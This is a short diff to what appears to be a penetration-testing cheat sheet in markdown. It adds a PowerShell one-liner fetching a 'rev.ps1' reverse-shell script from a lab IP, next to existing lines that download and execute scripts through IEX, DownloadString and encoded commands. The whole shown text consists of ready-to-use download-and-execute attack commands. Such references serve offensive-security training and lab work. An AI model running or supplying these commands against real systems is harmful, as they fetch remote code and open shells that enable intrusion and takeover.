@@ -35,6 +35,8 @@ powershell "iex(new-object net.webclient).downloadstring('http://10.10.10.10/Inv
 echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile
 
 powershell -encodedcommand <base64>
+
+powershell.exe 'IWR http://10.10.10.10/rev.ps1 -UseBasicParsing'
 ```
 
 </details>
